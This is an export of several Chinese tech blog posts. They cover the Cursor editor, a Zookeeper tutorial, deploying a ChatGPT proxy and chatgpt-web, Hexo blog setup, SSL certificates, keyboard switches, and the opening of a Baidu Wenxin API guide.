公众号发送 “Cursor” # 3、IDE 功能介绍 首先，Cursor 目前是一款独立的应用，你可以理解为是一个更精简版的 sublime 或 vim, 仅仅是一个编辑器，IDE 的功能上也明显弱于 VS Code。不过能够它能够借助 chatgpt 的能力，极大的加速我们的编程效率。 核心功能其实只用到了两个快捷键，一个是 Ctrl+K（⌘+K），一个是 Ctrl+L（⌘+L） 界面上就三个菜单栏：File、Edit、View，然后就是右上角的 4 个图标了。 点击 setting 按钮，出现一个设置的配置，需要注意的就是 Cursor 编辑器支持 vim、emacs；支持绑定 Copilot；支持安装不同语言的 server。 # Generate(⌘+K) 在输入框里面输入你需要让它帮助你写什么代码，回车后它就开始自动帮助你写代码了。举个例子，接到个需求要写一个 H5 的登录页面，可以通以快捷键输入： 12请用hooks编写一个H5登录界面复制代码 一个简单的页面架构就大致生成了： # Edit Selection(⌘+K) 可以选择一段代码，然后针对这段代码提出一些修改要求，比如： 1登录界面添加手机号校验和密码规则校验： 根据上下文，模拟接口调用： # Chat(⌘+L) 类似于集成了 chatGPT，你可以在 Cursor 里面使用 chatGPT 去问任何问题，相当于不需要专门去 官网 了或者搜索引擎就可以找到答案。 上面的例子里，在生成代码后，用户还可以按下 Ctrl+L 针对生成的代码进行提问： # Chat Selection(⌘+L) 可以选择一段代码，然后针对这段代码提出一些问题。例如你最近想了解下 react 中的 diff 算法是怎么实现的，你可以借助 Cursor 找到具体的位置并得到解释： # 对比 GitHub Copilot 用 Copilot 也可以实现上述功能，但是 Copilot 更侧重于代码的补全，想要实现以上登录页例子，需要一行一行的补全，体验上差了点。 目前而言相比 Copilot，最大的优势当然是免费，目前任处于体验期间，后续正式版应该也会收费。 一个字，快！能处理很长的代码，选中了让给你分析还能定位到关键代码行。 # 缺陷 可以从 issues 很直观的看到，每天都会新增大量的反馈意见（当然从侧面也反映了 Cursor 当前的火热程度） 体验了两天，感觉工作流比较割裂，在 vsCode 和 cursor 之间疯狂切换 比较遗憾的是，Cursor 作者没有添加 vsCode 插件的计划 chatgpt 通病，有字数限制，但可以通过提示继续（这个也能理解，毕竟免费） 官网上说是和 openai 有官方合作，模型用的是 GPT4，但不少用户反馈还是基于 3.5，大家可以自己去测试一下 没有找到修改快捷键的入口，导致一按⌘+Q（代码格式化）就退出系统，很难受 # 总结 客观评价，目前这个 IDE 是一个非常初级的产品，功能非常少，现阶段肯定无法取代 vscode，看它后续的发展了，大家更关注的可能还是 GPT4 的功能。过阵子等多模态开放了，比较期待图片视频识别等功能。不过我认为 Cursor 亦或是 ChatGPT，现在依然还是个大黑盒，你不去开箱永远不知道能带给你什么惊喜，就像是你以前只能读懂你认知以内的代码，但是 AIGC 的出现的确能加快影响你的认知。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/06/01/%E3%80%90chatGPT%E3%80%91%E5%85%85%E6%BB%A1%E5%8F%AF%E8%83%BD%E7%9A%84%E6%96%B0%E4%B8%80%E4%BB%A3%E8%BE%85%E5%8A%A9%E7%BC%96%E7%A8%8B%E7%A5%9E%E5%99%A8%EF%BC%9ACursor/"},{"title":"【Zookeeper】Zookeeper入门看这篇就够了","text":"# 【Zookeeper】Zookeeper 入门看这篇就够了 Zookeeper是什么 官方文档上这么解释zookeeper，它是一个分布式服务框架，是Apache Hadoop 的一个子项目，它主要是用来解决分布式应用中经常遇到的一些数据管理问题，如：统一命名服务、状态同步服务、集群管理、分布式应用配置项的管理等。 上面的解释有点抽象，简单来说zookeeper=文件系统+监听通知机制。 1、 文件系统 Zookeeper维护一个类似文件系统的数据结构： 每个子目录项如 NameService 都被称作为 znode(目录节点)，和文件系统一样，我们能够自由的增加、删除znode，在一个znode下增加、删除子znode，唯一的不同在于znode是可以存储数据的。 有四种类型的znode： PERSISTENT-持久化目录节点客户端与zookeeper断开连接后，该节点依旧存在 PERSISTENT_SEQUENTIAL-持久化顺序编号目录节点客户端与zookeeper断开连接后，该节点依旧存在，只是Zookeeper给该节点名称进行顺序编号 EPHEMERAL-临时目录节点客户端与zookeeper断开连接后，该节点被删除 EPHEMERAL_SEQUENTIAL-临时顺序编号目录节点客户端与zookeeper断开连接后，该节点被删除，只是Zookeeper给该节点名称进行顺序编号 2、 监听通知机制 客户端注册监听它关心的目录节点，当目录节点发生变化（数据改变、被删除、子目录节点增加删除）时，zookeeper会通知客户端。 就这么简单，下面我们看看Zookeeper能做点什么呢？ Zookeeper能做什么 zookeeper功能非常强大，可以实现诸如分布式应用配置管理、统一命名服务、状态同步服务、集群管理等功能，我们这里拿比较简单的分布式应用配置管理为例来说明。 假设我们的程序是分布式部署在多台机器上，如果我们要改变程序的配置文件，需要逐台机器去修改，非常麻烦，现在把这些配置全部放到zookeeper上去，保存在 zookeeper 的某个目录节点中，然后所有相关应用程序对这个目录节点进行监听，一旦配置信息发生变化，每个应用程序就会收到 zookeeper 的通知，然后从 zookeeper 获取新的配置信息应用到系统中。 如上，你大致应该了解zookeeper是个什么东西，大概能做些什么了，我们马上来学习下zookeeper的安装及使用，并开发一个小程序来实现zookeeper这个分布式配置管理的功能。 Zookeeper单机模式安装 Step1：配置JAVA环境，检验环境：java -version Step2：下载并解压zookeeper # cd /usr/local # wget http://mirror.bit.edu.cn/apache/zookeeper/stable/zookeeper-3.4.12.tar.gz # tar -zxvf zookeeper-3.4.12.tar.gz # cd zookeeper-3.4.12 Step3：重命名配置文件zoo_sample.cfg # cp conf/zoo_sample.cfg conf/zoo.cfg Step4：启动zookeeper # bin/zkServer.sh start Step5：检测是否成功启动，用zookeeper客户端连接下服务端 # bin/zkCli.sh Zookeeper使用 使用客户端命令操作zookeeper 1、使用 ls 命令来查看当前 ZooKeeper 中所包含的内容 2、创建一个新的 znode ，使用 create /zkPro myData 3、再次使用 ls 命令来查看现在 zookeeper 中所包含的内容： 4、下面我们运行 get 命令来确认第二步中所创建的 znode 是否包含我们所创建的字符串： 5、下面我们通过 set 命令来对 zk 所关联的字符串进行设置： 6、下面我们将刚才创建的 znode 删除 使用Java API操作zookeeper 使用Java API操作zookeeper需要引用下面的包 下面我们来实现上面说的分布式配置中心： 1、在zookeeper里增加一个目录节点，并且把配置信息存储在里面 2、启动两个zookeeper客户端程序，代码如下所示 import java.util.concurrent.CountDownLatch; import org.apache.zookeeper.WatchedEvent; import org.apache.zookeeper.Watcher; import org.apache.zookeeper.Watcher.Event.EventType; import org.apache.zookeeper.Watcher.Event.KeeperState; import org.apache.zookeeper.ZooKeeper; import org.apache.zookeeper.data.Stat; /** 分布式配置中心 demo @author */ public class ZooKeeperProSync implements Watcher { private static CountDownLatch connectedSemaphore = new CountDownLatch(1); private static ZooKeeper zk = null; private static Stat stat = new Stat(); public static void main(String[] args) throws Exception { //zookeeper配置数据存放路径 String path = &quot;/username&quot;; //连接zookeeper并且注册一个默认的监听器 zk = new ZooKeeper(&quot;192.168.31.100:2181&quot;, 5000, // new ZooKeeperProSync()); //等待zk连接成功的通知 connectedSemaphore.await(); //获取path目录节点的配置数据，并注册默认的监听器 System.out.println(new String(zk.getData(path, true, stat))); Thread.sleep(Integer.MAX_VALUE); } public void process(WatchedEvent event) { if (KeeperState.SyncConnected == event.getState()) { //zk连接成功通知事件 if (EventType.None == event.getType() &amp;amp;&amp;amp; null == event.getPath()) { connectedSemaphore.countDown(); } else if (event.getType() == EventType.NodeDataChanged) { //zk目录节点数据变化通知事件 try { System.out.println(&quot;配置已修改，新值为：&quot; + new String(zk.getData(event.getPath(), true, stat))); } catch (Exception e) { } } } } } 两个程序启动后都正确的读取到了zookeeper的/username目录节点下的数据'qingfeng' 3、我们在zookeeper里修改下目录节点/username下的数据 修改完成后，我们看见两个程序后台都及时收到了他们监听的目录节点数据变更后的值，如下所示 Zookeeper集群模式安装 本例搭建的是伪集群模式，即一台机器上启动三个zookeeper实例组成集群，真正的集群模式无非就是实例IP地址不同，搭建方法没有区别 Step1：配置JAVA环境，检验环境：java -version Step2：下载并解压zookeeper # cd /usr/local # wget http://mirror.bit.edu.cn/apache/zookeeper/stable/zookeeper-3.4.12.tar.gz # tar -zxvf zookeeper-3.4.12.tar.gz # cd zookeeper-3.4.12 Step3：重命名 zoo_sample.cfg文件 # cp conf/zoo_sample.cfg conf/zoo-1.cfg Step4：修改配置文件zoo-1.cfg，原配置文件里有的，修改成下面的值，没有的则加上 # vim conf/zoo-1.cfg dataDir=/tmp/zookeeper-1 clientPort=2181 server.1=127.0.0.1:2888:3888 server.2=127.0.0.1:2889:3889 server.3=127.0.0.1:2890:3890 配置说明 tickTime：这个时间是作为 Zookeeper 服务器之间或客户端与服务器之间维持心跳的时间间隔，也就是每个 tickTime 时间就会发送一个心跳。 initLimit：这个配置项是用来配置 Zookeeper 接受客户端（这里所说的客户端不是用户连接 Zookeeper 服务器的客户端，而是 Zookeeper 服务器集群中连接到 Leader 的 Follower 服务器）初始化连接时最长能忍受多少个心跳时间间隔数。当已经超过 10个心跳的时间（也就是 tickTime）长度后 Zookeeper 服务器还没有收到客户端的返回信息，那么表明这个客户端连接失败。总的时间长度就是 10*2000=20 秒 syncLimit：这个配置项标识 Leader 与 Follower 之间发送消息，请求和应答时间长度，最长不能超过多少个 tickTime 的时间长度，总的时间长度就是 5*2000=10秒 dataDir：顾名思义就是 Zookeeper 保存数据的目录，默认情况下，Zookeeper 将写数据的日志文件也保存在这个目录里。 clientPort：这个端口就是客户端连接 Zookeeper 服务器的端口，Zookeeper 会监听这个端口，接受客户端的访问请求。 server.A=B：C：D：其中 A 是一个数字，表示这个是第几号服务器；B 是这个服务器的 ip 地址；C 表示的是这个服务器与集群中的 Leader 服务器交换信息的端口；D 表示的是万一集群中的 Leader 服务器挂了，需要一个端口来重新进行选举，选出一个新的 Leader，而这个端口就是用来执行选举时服务器相互通信的端口。如果是伪集群的配置方式，由于 B 都是一样，所以不同的 Zookeeper 实例通信端口号不能一样，所以要给它们分配不同的端口号。 Step4：再从zoo-1.cfg复制两个配置文件zoo-2.cfg和zoo-3.cfg，只需修改dataDir和clientPort不同即可 # cp conf/zoo-1.cfg conf/zoo-2.cfg # cp conf/zoo-1.cfg conf/zoo-3.cfg # vim conf/zoo-2.cfg dataDir=/tmp/zookeeper-2 clientPort=2182 # vim conf/zoo-2.cfg dataDir=/tmp/zookeeper-3 clientPort=2183 Step5：标识Server ID 创建三个文件夹/tmp/zookeeper-1，/tmp/zookeeper-2，/tmp/zookeeper-2，在每个目录中创建文件myid 文件，写入当前实例的server id，即1.2.3 # cd /tmp/zookeeper-1 # vim myid 1 # cd /tmp/zookeeper-2 # vim myid 2 # cd /tmp/zookeeper-3 # vim myid 3 Step6：启动三个zookeeper实例 # bin/zkServer.sh start conf/zoo-1.cfg # bin/zkServer.sh start conf/zoo-2.cfg # bin/zkServer.sh start conf/zoo-3.cfg Step7：检测集群状态，也可以直接用命令“zkCli.sh -server IP:PORT”连接zookeeper服务端检测 至此，我们对zookeeper就算有了一个入门的了解，当然zookeeper远比我们这里描述的功能多，比如用zookeeper实现集群管理，分布式锁，分布式队列，zookeeper集群leader选举等等 推荐阅读：https://www.roncoo.com/course/view/255bac222b1b4300b42838b58fea3a2e 文章来源：https://my.oschina.net/u/3796575/blog/1845035 ## 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/04/27/%E3%80%90Zookeeper%E3%80%91Zookeeper%E5%85%A5%E9%97%A8%E7%9C%8B%E8%BF%99%E7%AF%87%E5%B0%B1%E5%A4%9F%E4%BA%86/"},{"title":"【chatGPT】利用腾讯云函数免费部署国内直接使用ChatGPT代理，解决网络不可用及1020等问题","text":"# 【chatGPT】利用腾讯云函数免费部署国内直接使用 ChatGPT 代理，解决网络不可用及 1020 等问题 # 前言 在 Github 上发现一个项目，可以利用腾讯云提供的云函数，一分钟就能搭建好一台可以直接访问 ChatGPT 的代理，关键还是免费的。今天就来一起折腾它。 # 项目 项目地址：https://github.com/geekr-dev/openai-proxy # 教程 可以直接看官方文字教程，如果是新手，可以按我图文教程 # 第一步： ​ 登录腾讯控制台：https://console.cloud.tencent.com/scf/list ​ 如果之前没使用腾讯云函数，会提示授权 # 第二步：前往访问管理 ​ # 第三步：新建函数，记得选择非大陆地区哟 # 上传 Github 项目中的 ZIP 文件 # 第四步：高级配置 上传完 ZIP 文件，接着下拉，找到高级配置，点进去编辑 点高级配置的最右边的编辑按钮 # 第五步：获取代理地址 不要 &quot;/release&quot; 路径，只要取子域名部分就可以了 这时候访问路径内容和 api.open.com 的结果是一至的了。 至此：已经有了海外域名的代理地址了。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/03/07/%E3%80%90chatGPT%E3%80%91%E5%88%A9%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%87%BD%E6%95%B0%E5%85%8D%E8%B4%B9%E9%83%A8%E7%BD%B2%E5%9B%BD%E5%86%85%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8ChatGPT%E4%BB%A3%E7%90%86%EF%BC%8C%E8%A7%A3%E5%86%B3%E7%BD%91%E7%BB%9C%E4%B8%8D%E5%8F%AF%E7%94%A8%E5%8F%8A1020%E7%AD%89%E9%97%AE%E9%A2%98/"},{"title":"【chatGPT】基于Docker如何快速部署自己的ChatGPT","text":"# 基于 Docker 如何快速部署自己的 ChatGPT # 背景 随着 OpenAI 在 2022 年底发布的 LLM 模型 - ChatGPT 展现出的强大效果，ChatGPT 无疑成为了当下炙手可热的明星模型。 现有的基于 GPT 的开源项目已经非常多，本文以现有的高热度 github 开源项目 chatgpt-web 为例，教大家简单快速地搭建属于自己的 ChatGPT。 # ChatGPT-Web chatgpt-web 项目中的部署教程已经非常完整，本文不再过多解释。 仅以 Docker 部署为例 前置条件 本地或者服务器应该具有 Docker 环境 具有 ChatGPT 帐号 以 token 模式为例，请求 chatgpt web 版本，免费但稍微具有延迟 Step1. 找到你帐号的 token 点击 https://chat.openai.com/api/auth/session，获取你帐号的 token，并记录他 Step2. 运行 docker 按需配置访问 Web 页面的密码，Token、超时等信息 12docker run --name chatgpt-web -d -p 127.0.0.1:3888:3002 --env OPENAI_ACCESS_TOKEN=your_access_token --env AUTH_SECRET_KEY=you_secret_key chenzhaoyu94/chatgpt-web1 Step3. 访问 localhost:3002 查看效果 在上述步骤中我们无需进行任何代理，就可以直接与 GPT 交流，使用 API 方式同理。当然了，根据项目作者的介绍，使用 API 时需要进行代理自建。 如果你只是在本地部署给自己使用，那么以上 3 步就满足了需求，如果想要在公网访问，或者像 App 一样访问你的 ChatGPT，那么请接着往下看。 # Nginx 反向代理 以宝塔面板为例，我们在服务器上拉起 docker 镜像后，可以通过 ip:port 进行访问 但通常来说我们的网站带有域名，以笔者所使用的腾讯云服务器为例 前置条件 拥有一个域名 拥有一台云服务器 Step1. SSL 证书 首先在云产品中找到 SSL 证书，点击我的证书 - 免费证书 - 申请免费证书 填写申请的域名，申请成功之后，点击下载，下载 nginx 格式的即可 Step2. 配置域名 SSL 在宝塔面板中选择 - 网站 - 添加站点 填写刚刚申请 SSL 证书的域名，选择纯静态，其余默认，点击确定即可 Step3. 配置证书 点击添加好的网站，然后点击 SSL，填入刚刚下载的文件中的 key 和 pem 配置完成后点击保存 Step4. 配置 DNS 解析 在云产品中搜索 - 云解析 - 选择 DNS 解析 DNSPod 点击我的域名 - 添加记录 填入刚刚申请的域名，如果带有前缀，则第一个红框填入你的域名前缀，比如 www.baidu.com，则这里填 www 第二个红框填写你的服务器 ip，或者你的 CDN 域名 Step5. 配置反向代理 在宝塔面板中，点击刚刚添加的网站，点击反向代理，填入刚刚 docker 启动时的宿主机端口 如上文中的 3888 以上配置完成之后，访问 https:// 你的域名就可以了～ # PWA 支持 PWA 技术可以让我们访问网站能够拥有访问 App 一般的体验，在 chatgpt-web 中已经内嵌，但默认是关闭的 我们可以通过设置启动时的参数 -env VITE_GLOB_APP_PWA=true 将他打开 12docker run --name chatgpt-web -d -p 127.0.0.1:3888:3002 --env OPENAI_ACCESS_TOKEN=your_access_token --env AUTH_SECRET_KEY=you_secret_key --env VITE_GLOB_APP_PWA=true chenzhaoyu94/chatgpt-web1 部署成功之后，我们再到手机上访问该网站时便可以保存他在桌面了。 默认的 PWA 图标和全局用户信息配置在项目中，即使在网页可以修改当前登陆者的用户信息，在清除 Cookie 之后便会还原，如果你想定制这两种信息，请拉下 chatgpt-web 项目进行镜像自定义 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/03/04/%E3%80%90chatGPT%E3%80%91%E5%9F%BA%E4%BA%8EDocker%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2%E8%87%AA%E5%B7%B1%E7%9A%84ChatGPT/"},{"title":"Hexo搭建","text":"# hexo 框架个人博客搭建 # 1 环境准备 # 1.1 Node.js 和 npm 安装 1NoedJS自行百度安装 # 1.2 (选) npm 淘宝镜像 1npm install -g cnpm --registry.npm.taobao.org # 1.3 hexo 框架安装 1cnpm install -g hexo-cli # 1.4git 安装配置 git 官网 下载对应系统安装包 运行安装包 一路下一步 开始菜单运行 Git Bash (运行成功表示 git 安装成功) git 安装好去 GitHub 上注册一个账号 设置 git：在 Git Bush 命令行中输入 1234# 配置用户名git config --global user.name &quot;username&quot; //（ &quot;username&quot;是自己的账户名）# 配置邮箱git config --global user.email &quot;username@email.com&quot; //(&quot;username@email.com&quot;注册账号时用的邮箱) 以上命令执行结束后，可用 git config –global –list 命令查看配置是否 OK 生成 ssh, 在命令框中输入以下命令 1ssh-keygen -t rsa 连续敲三次回车，结束后去系统盘目录下（一般在 C:\\Users\\ 你的用户名.ssh）(mac: /Users/ 用户 /.ssh）查看是否有：ssh 文件夹生成 \\7. 将 ssh 文件夹中的公钥（ id_rsa.pub）添加到 GitHub 管理平台中，在 GitHub 的个人账户的设置中找到如下界面 title 随便起一个，将公钥（ id_rsa.pub）文件中内容复制粘贴到 key 中，然后点击 Ass SSH key 就好啦 # 2 建立本地网站 # 2.1 在本地建立一个文件夹 1去任意盘符下，建立一个文件夹，这个文件夹就是你的博客文件夹 # 2.2 cmd 命令进入这个文件夹 1进入文件夹后，路径输入cmd进入命令提示符窗口 # 2.3 hxeo 生成博客 1sudo hexo init # 2.4 启动博客 1hexo s 进入网站 说明建立成功 # 3 上传至 github # 3.1 建立仓库 登录 github 新建一个仓库 仓库名必须是 “&lt;&lt;你的 Github 名字&gt;&gt;.github.io” # 3.2 在博客目录安装 git 插件 1cnpm install --save hexo-deployer-git # 3.3 设置文件 “_config.yml”（最底部） 1234deploy: type: git repo: //仓库的ssh地址 branch: master # 3.4 部署到远端 1hexo d //需要登陆 # 3.5 访问 ”https://&lt;&lt;你的 username&gt;&gt;.github.io“ 1234567补充命令：hexo clean 清理博客hexo generate 同步博客hexo deploy 提交博客 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/09/04/%E3%80%90%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E3%80%91Hexo/"},{"title":"腾讯云申请的免费证书部署到阿里云CDN和云盾证书中心","text":"# 腾讯云申请的免费证书部署到阿里云 CDN 和云盾证书中心 tips：以下内容仅支持有域名的小伙伴配置，没有域名请先申请域名 小伙伴们在有了自己的不知道如何部署 HTTPS？请看下面的操作 ​ 为什么不在阿里云申请 SSL 证书 ​ 答：阿里云免费证书很慢，而且付费的超级贵 所以本教程让大家在腾讯云官方申请 SSL 证书，注意：有效期只能为 1 年，过期不续费，只能重新申请和配置 1. 进入腾讯云证书官网： https://console.cloud.tencent.com/ssl 2. 点击申请免费证书 3. 输入绑定的域名、校验方式选择自动 DNS 验证、邮箱填写常用邮箱 点击提交申请，等待校验通过 4. 申请通过后会颁发证书 5. 点击右侧下载，选择 Nginx 证书压缩包 解压缩后可以看见如下文件 6. 进入阿里云 云盾证书管理 https://yundunnext.console.aliyun.com/?spm=5176.11785003.domainDetail.14.4251142fPqrVnU&amp;p=cas#/certExtend/upload 点击上传证书 点击确定后上传成功。 接下来就可以在阿里云使用你在腾讯云申请的证书来支持你的 CDN HTTPS 服务拉！ # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/08/28/%E3%80%90%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E3%80%91%E8%85%BE%E8%AE%AF%E4%BA%91%E7%94%B3%E8%AF%B7%E7%9A%84%E5%85%8D%E8%B4%B9%E8%AF%81%E4%B9%A6%E9%83%A8%E7%BD%B2%E5%88%B0%E9%98%BF%E9%87%8C%E4%BA%91CDN%E5%92%8C%E4%BA%91%E7%9B%BE%E8%AF%81%E4%B9%A6%E4%B8%AD%E5%BF%83/"},{"title":"【外设】机械键盘轴体怎么选？三模热插拔原来是这么回事","text":"# 前言 ​ 随着科技进步和生活品质的提高，机械键盘凭借其超长的使用寿命和非凡的手感夺回曾被薄膜键盘抢走十余年的金交椅，成为外设发烧友与游戏玩家的掌中爱物。除去寿命和使用手感，三模热插拔机械键盘可以根据玩家个人喜好使用需求，让自己心爱的机械键盘拥有独一无二的外观。 # 三模热插拔键盘是什么？ 三模是一种键盘的连接模式，是指键盘支持有线、蓝牙和无线 2.4G 三种模式的连接方式。有线的连接方式简单，延迟率低，能提供更好的稳定性和兼容性。无线 2.4G 是需要电脑插入接收器，使键盘与接收器互联但容易受到同频段干扰。蓝牙模式则同时与平板电脑、手机等多设备进行快速无缝切换。市场上的单模、双模键盘更换率高、性能单一，三模键盘无疑是多设备简洁党玩家的首选，不管用不用得上买就对了。 热插拔即带电插拔，热插拔功能就是允许用户在不关闭系统，不切断电源的情况下更换零件后能立即识别且及时恢复公用，不需要系统对键盘进行二次识别。这样一来又能对机械键盘进行 DIY。 即使不为 DIY，买机械键盘也离不开对轴体的选择。 # 轴体的结构组成： 轴体结构分化图 # 机械轴体主要分为线性轴和段落轴。 对于选择困难户来说，轴体型号五花八门，不同的轴体具有不同的特性。 先来说说段落轴。顾名思义段落轴按到一半会触发一个段落变化，有很明显的段落感，声音大。 （1） 青轴：必须承认樱桃青轴的经典设计。段落感强，具有明显清脆的敲击声，有阻滞感，易疲劳且有极大的噪音污染。住宿的学生党和长时间文字输入用户不建议使用。 （2） BOX 白轴：按压时带来清脆整齐的 “圆珠笔” 音，回弹力度大。声音、段落感比青轴轻，手感也比较不易疲累，是一款防尘防水的段落轴，在老式的机械键盘上经常出现。 （3） 静音月白轴：一款把段落手感前置的轴体。加入了双重降噪设计，手感上具有十分有力的回弹。强烈的大段落手感更加接近早期的段落轴但没有白轴的沉重感。想体验提前大段落手感并且有静音处理的用户不妨试试。 （4） 茶轴：一款入门级高性价比的机械键盘轴体，人称 “万能轴”。主要体现在各方面表现比较均衡，段落感较弱，不易误触、敲击声小、手感柔和、舒适感强是大多数人能接受的轴体。在职场办公想要有明晰的段落感又不想打扰到别人，那茶轴是一个不可多得的选择。 追求段落感兼备游戏办公需求的可选茶轴 还有线性轴，线性轴特点是直上直下，声音小、没有段落感。举例如下： （1） 红轴：又称入坑轴，是线性轴体的典型代表。如果你是手劲小的女玩家可以尝试，手感上和普通的薄膜键盘比较类似。直上直下的设计带来轻盈的手感也不易累，敲击声小、反应灵敏、按压后的回弹柔和，兼顾日常游戏和打字办公的需求。 （2） G 黄轴 PRO：属于偏重手感的线性轴，从品名上能看出是 G 黄的升级版，自带厂润手感更顺滑，轴芯更稳定，声音小但有些许的闷，是目前性价比非常高的国产轴体。 （3） G 银轴 PRO：顺滑度和 G 黄轴 PRO 相比更胜一筹，提前触底声音小，触发速度快，轴芯稳定没有明显的晃动感。雷蛇、罗技这类游戏键盘上都是使用类似定制的轴体，非常适合游戏场景。 （4） 快银轴：属于轻压力线性轴体，是银轴的升级版。快银轴使用了 TTC 双侧墙防尘壁专利技术结构，极大的增加轴体使用寿命，TTC 快银轴整体手感顺滑，几乎没有杂音；触发速度快、键程短、回弹跟手不易误触、轴心稳定性强。人送称号：国货天花板游戏神器。 （5） 金粉轴： 整体手感轻盈、温柔，按压时更加顺滑也具备稳定有力的回弹，声音脆 ，杂音小且具备出色的跟手感是目前公认的顶级轻压力线性轴，被誉为码字神轴。适合长时间打字用户。 （6） 黑轴：按压的声音小、没有段落感，键程很短 、敏感度及反弹力强。但需要花大力气去按压，用久手指容易酸累，是 “大力金刚指玩家” 的游戏键盘首选轴体。 选择一款机械轴体基本就是选择段落轴和线性轴区别，之后依据敲击声和舒适感再进行详细划分，就能找到适合自己的轴体，不妨买个试轴器体验一下。想要轴体寿命长的颜值党也是推荐定制类的轴体。 机械键盘还具有一招更换键帽独门秘技。同样的轴体手感依旧有所大不相同，所以在键帽的设计上除去工艺的差距，键帽的材质上也极为讲究。 键帽有三类材质：ABS、PBT 和 POM。ABS 是使用频率最高的键帽材料，不管低价位普及型产品还是上千元的高端旗舰机械键盘，都可以看到 ABS 键帽的身影。POM 材质高成本也一同指向高售价的高端产品，所以 POM 材质键帽在键盘市场越来越少见。 ABS 材质本身便于加工、成本低、强度高、韧性好、透光性比 PBT 强，推荐喜欢光污染 RGB 的用户。键帽触感细腻润滑，饱和度高、色彩鲜艳。尽管制作工艺成熟但是不耐高温、耐磨性差，长时间使用后整个键盘表面表现得油光逞亮，被称为 “打油” 现象，影响美观，手感更是大打折扣。 “打油” 展示图 不能断定 ABS 材质都是不好的，价格昂贵又好看的键帽有不少是 ABS 材质。ABS 结合其他成分制作的键帽也有很耐磨的，主要看工艺和成本。 PBT 材质耐磨性明显优于 ABS，材质是最坚韧的工程热塑材料之一，耐高热，有非常好的化学稳定性。用 PBT 材质制作的键帽触感干爽硬朗，具有非常独特的磨砂感，耐磨性相当不错。手感上略硬一些，色彩还原度高也不易掉色，主要适用于浅色键帽。长时间使用不 “打油” 的特性得到资深玩家的热爱，但并不表示 “永不打油”，一些成本便宜成分含量低的光面 PBT 键帽一样会打油。除了以上两款常见材质外还有树脂、金属这种比较少见的材质，通常做成个性键帽，主要特点是装饰键盘突显个性，价格昂贵。 “横看成岭侧成峰，远近高低各不同”。 不同高度的键帽在同一把机械键盘上又会是截然不同的输入体验。总而言之适合自己才是最好的，不必盲目追求复古与特殊，舒适才是最为轻松自在的。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/10/15/%E3%80%90%E5%A4%96%E8%AE%BE%E3%80%91%E6%9C%BA%E6%A2%B0%E9%94%AE%E7%9B%98%E8%BD%B4%E4%BD%93%E6%80%8E%E4%B9%88%E9%80%89%EF%BC%9F%E4%B8%89%E6%A8%A1%E7%83%AD%E6%8F%92%E6%8B%94%E5%8E%9F%E6%9D%A5%E6%98%AF%E8%BF%99%E4%B9%88%E5%9B%9E%E4%BA%8B/"},{"title":"【文心一言】百度文心一言大型语言模型接入教程","text":"# 【文心一言】百度文心一言大型语言模型接入教程 # 文心一言是百度的智能对话产品，它可以与用户进行流畅、自然、有趣的多轮对话，涵盖了生活、娱乐、教育、商务等多个领域和场景。文心一言不仅可以作为一个独立的应用供用户使用，也可以通过百度智能云的 API 调用接口，为各行各业的企业客户提供强大而灵活的 AI 能力，赋能更多行业伙伴。 # 那么，作为一个企业客户，如何接入文心一言呢？本文将为您介绍百度智能云提供的全面的 AI 解决方案，帮助您快速实现与文心一言的对接和集成。 # 01 第一步：注册百度智能云账号 要使用百度智能云提供的服务和产品，您首先需要注册一个百度智能云账号。您可以通过以下方式进行注册： 访问百度智能云官网 (https://cloud.baidu.com/)，点击右上角 “免费注册” 按钮。 输入您的手机号码，并获取验证码。 设置您的登录密码，并同意服务协议。 完成实名认证，并选择账号类型 (个人或企业)。 完成以上步骤后，您就成功注册了一个百度智能云账号。 # 02 第二步：申请文心一言 API 调用权限 ​ 要使用文心一言 API 调用接口，您需要申请相应的权限。您可以通过以下方式进行申请： 登录百度智能云控制台 (https://console.bce.baidu.com/)，点击左侧导航栏 “人工智能” 下拉菜单中的 “自然语言处理” 选项。 在自然语言处理页面中，找到 “文心一言” 产品，并点击 “立即使用” 按钮。 在弹出窗口中填写相关信息，并提交申请。 等待审核结果。审核通过后，您就可以在控制台中查看并管理您的文心一言 API 调用权限。 # 03 第三步：配置并测试文心一言 API 调用接口 ​ 进入：https://wenxin.baidu.com/user/key ​ 使用文心一言 API 调用接口，您需要配置相关参数，并进行测试。您可以通过以下方式进行配置和测试： 在控制台中进入 “自然语言处理” 页面，并点击 “文心一言” 产品下方的 “管理” 按钮，进入文心一言 API 调用接口的配置页面。 在配置页面中，您可以查看并修改您的文心一言 API 调用接口的基本信息，如应用名称、应用描述、应用类型等。 您还可以在配置页面中设置您的文心一言 API 调用接口的安全认证方式，如 Access Key ID 和 Secret Access 